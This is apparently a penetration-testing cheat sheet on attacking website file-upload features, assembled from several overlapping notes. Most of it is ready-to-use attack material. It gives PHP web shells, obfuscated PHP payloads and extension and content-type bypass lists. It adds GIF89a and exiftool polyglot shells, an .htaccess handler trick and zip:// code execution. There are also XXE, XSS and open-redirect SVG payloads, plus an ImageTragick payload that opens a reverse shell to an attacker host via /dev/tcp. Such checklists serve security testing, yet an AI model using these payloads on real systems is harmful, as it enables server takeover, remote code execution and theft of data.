---

### **File Upload Vulnerabilities & Techniques**

#### **1. Basic Techniques**
- File Name Manipulation:
  - 02.mp3";id;#
  - Try uploading a text file with .png extension.
  - Try the same with .svg and inject XML: Video Tutorial (https://youtu.be/Iq6ThCmUTOU?si=-waZobykOkxOdf8L).
  - Try injecting XSS code in the file.

#### **2. Tools for Exploitation**
- Exif Tool: Manipulate metadata.
- jhead: Inject headers into image files.
- Video Tutorial: jhead (https://youtu.be/CmF9sEyKZNo?si=xpqlS0H2gpb7flmt).

#### **3. .htaccess File Manipulation**
- Add the following line to .htaccess:
  - AddType application/x-httpd-php .l33t
- Then upload a PHP file with .l33t extension.

#### **4. File Extension Bypass Techniques**
- file.jpg.{EXT}
- file.{EXT}.jpg
- file.{EXT}.xxxjpg
- file.{EXT}%00.jpg
- file.{EXT}\x00.jpg
- file.{EXT}%00
- file.{EXT}\x00
- file.{EXT}%20
- file.{EXT}%0d%0a.jpg
- file.{EXT}/
- file.{EXT}.\

#### **5. ZIP File Exploitation**
- Place RCE.php in a .zip file.
- Upload the .zip file.
- Access it via: http://www.target.com?file=zip://uploadedFile.zip%23RCE.php

#### **6. References**
- RCE Vulnerability in File Name: https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/
- Shell Uploading: https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
- File Upload Security Tips: https://security-tips.vincd.com/file-upload/
- Multipart Parsers Validation Bypass: https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/

---
- https://0xcybery.github.io/blog/hacking-with-pdf##Introduction
- 
------------

---

### **File Upload Vulnerabilities and Exploitation**

---

#### **1. File Extension Bypass**
- **Blacklisted Extensions**:  
  - PHP: `.phtm`, `.phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`  
  - ASP: `.asp`, `.aspx`, `.cer`, `.asa`  
  - JSP: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`  
  - ColdFusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`  
  - Random capitalization: `.pHp`, `.pHP5`, `.PhAr`  

- **Whitelisted Extensions**:  
  - Double extensions: `file.jpg.php`, `file.php.jpg`  
  - Null byte injection: `file.php%00.jpg`, `file.php\x00.jpg`  
  - Trailing characters: `file.php.....`, `file.php/`, `file.php.\`  
  - Other tricks: `file.php%20`, `file.php%0d%0a.jpg`, `file.`, `.html`  

- **IIS (Windows)**: Upload `.asp` files using `.cer` or `.asa` extensions.  

---

#### **2. Payloads for File Upload**
- **PHP Web Shells**:  
  ```php
  <?php system($_GET["cmd"]);?>  // Usage: ?cmd=ls
  <?=`$_GET[0]`?>                // Usage: ?0=command
  <?=`$_POST[0]`?>               // Usage: POST with "0=command"
  <?=`{$_REQUEST['_']}`?>        // Usage: ?_=command or POST with "_=command"
  ```
- **Obfuscated PHP Payloads**:  
  ```php
  <?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`;?>
  <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
  ```

---

#### **3. Content-Type Manipulation**
- **Preserve filename but change content-type**:  
  - Use `Content-Type: image/jpeg`, `image/gif`, or `image/png` for malicious files.  

---

#### **4. Impact by File Extension**
- **Web Shell/RCE**: `.asp`, `.aspx`, `.php5`, `.php`, `.php3`  
- **Stored XSS/SSRF/XXE**: `.svg`, `.gif`  
- **CSV Injection**: `.csv`  
- **XXE**: `.xml`  
- **LFI/SSRF**: `.avi`  
- **HTML Injection/XSS**: `.html`, `.js`  
- **Pixel Flood Attack (DoS)**: `.png`, `.jpeg`  
- **RCE via LFI/DoS**: `.zip`  
- **SSRF/Blind XXE**: `.pdf`, `.pptx`  

---

#### **5. File Name Exploitation**
- **Path Traversal**:  
  - Example: `../../etc/passwd/logo.png`, `../../../logo.png`  
- **SQL Injection**:  
  - Example: `sleep(10).jpg`, `sleep(10)-- -.jpg`  
- **Command Injection**:  
  - Example: `; sleep 10;`  
- **XSS**:  
  - Example: `<svg onload=alert(document.domain)>.svg`  

---

#### **6. Other Test Cases**
- **ImageTragick (SVG)**:  
  - Exploit SSRF or RCE via SVG file upload.  
  - Example:  
    ```xml
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
      <script type="text/javascript">alert("XSS");</script>
    </svg>
    ```
- **Open Redirect via SVG**:  
  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='http://www.google.com'" xmlns="http://www.w3.org/2000/svg"></svg>
  ```

---

#### **7. Advanced Techniques**
- **Web Shell via `.htaccess`**:  
  - Upload `.htaccess` with:  
    ```plaintext
    AddType application/x-httpd-php .l33t
    ```  
  - Then upload a file with `.l33t` extension containing PHP code.  

- **Polyglot Web Shell**:  
  - Use `exiftool` to inject PHP code into an image:  
    ```bash
    exiftool -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
    ```  

- **EXIF Data Not Stripped**:  
  - Upload images with EXIF data and check if it’s preserved.  
  - Use tools like [exif.regex.info](http://exif.regex.info/exif.cgi) to verify.  

---

#### **8. Top HackerOne Reports**
- **Remote Code Execution**:  
  - Example: Logo upload on `www.semrush.com/my_reports` (792 upvotes).  
- **Web Shell via File Upload**:  
  - Example: `ecjobs.starbucks.com.cn` (673 upvotes).  
- **Blind XSS**:  
  - Example: Image upload on CS Money (412 upvotes, $1000).  
- **Unrestricted File Upload**:  
  - Example: `ambassador.mail.ru` (404 upvotes, $3000).  
- **SSRF via File Upload**:  
  - Example: Video upload on TikTok (139 upvotes, $2727).  

---

#### **9. Tools and Resources**
- **OCR for Captcha Bypass**: [Tesseract](https://github.com/tesseract-ocr/tesseract)  
- **Online Captcha Solvers**: [Capsolver](https://www.capsolver.com/)  
- **EXIF Sample Images**: [GitHub Repository](https://github.com/ianare/exif-samples)  

---

## Where to find
In upload file feature, for example upload photo profile feature

## How to exploit
read also this pdf it conayin a many of ideas                                                                                                               
1-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf                                    by`0xAwali`                   
2-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf                                      by`ebrahim hegazy`       

1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
Change the Content-Type
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```

2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php
```
Change the request to this
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

3. Upload the payload, but start with GIF89a; and
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```
And dont forget to change the content-type to image/gif

4. Bypass content length validation, it can be bypassed using small payload
```
(<?=`$_GET[x]`?>)
```

5. Using null byte in filename
```
file.php%00.gif
```

6. Using double extensions for the uploaded file
```
file.jpg.php
```

7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```

8. Try to randomly capitalizes the file extension
```
file.pHP5
```

9. Mix the tips!


- Upload Function
    - Extensions Impact
        - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
        - `SVG`: Stored XSS, SSRF, XXE
        - `GIF`: Stored XSS, SSRF
        - `CSV`: CSV injection
        - `XML`: XXE
        - `AVI`: LFI, SSRF
        - `HTML`, `JS` : HTML injection, XSS, Open redirect
        - `PNG`, `JPEG`: Pixel flood attack (DoS)
        - `ZIP`: RCE via LFI, DoS
        - `PDF`, `PPTX`: SSRF, BLIND XXE
    - Blacklisting Bypass
        - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
        - ASP → `asp`, `.aspx`, `.cer`, `.asa`
        - Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
        - Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
        - Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.php#.png`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
            - Set filename `../../etc/passwd/logo.png`
            - Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
            - Set filename `'sleep(10).jpg`.
            - Set filename `sleep(10)-- -.jpg`.
        - [ ]  Command Injection
            - Set filename `; sleep 10;`
        - [ ]  SSRF
            - Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
            - SSRF Through `.svg` file.

            ```php
            <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
            ```

        - [ ]  ImageTragic

            ```
            push graphic-context
            viewbox 0 0 640 480
            fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
            pop graphic-context
            ```

        - [ ]  XXE
            - Upload using `.svg` file

            ```xml
            <?xml version="1.0" standalone="yes"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
            <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
               <text font-size="40" x="0" y="16">&xxe;</text>
            </svg>
            ```

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
                <image xlink:href="expect://ls"></image>
            </svg>
            ```

            - Using excel file
        - [ ]  XSS
            - Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
            - Upload using `.gif` file

            ```
            GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
            ```

            - Upload using `.svg` file

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
            ```

            ```xml
            <?xml version="1.0" standalone="no"?>
            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

            <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
               <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
               <script type="text/javascript">
                  alert("HolyBugx XSS");
               </script>
            </svg>
            ```

        - [ ]  Open Redirect
            1. Upload using `.svg` file

            ```xml
            <code>
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <svg
            onload="window.location='https://attacker.com'"
            xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
            </svg>
            </code>
            ```

    - Content-ish Bypass
        - [ ]  Content-type validation
            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
            - Small PHP Shell

            ```php
            (<?=`$_GET[x]`?>)
            ```

        - [ ]  Content Bypass Shell
            - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )

            ```php
            GIF89a; <?php system($_GET['cmd']); ?>
            ```

    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name: `1234...99.png`
        - [ ]  Zip Slip
            - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
        - [ ]  Image Shell
            - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

            ```php
            exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
            ```

- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf
- https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf
- https://blog.doyensec.com/2025/01/09/cspt-file-upload.html
- 
- 
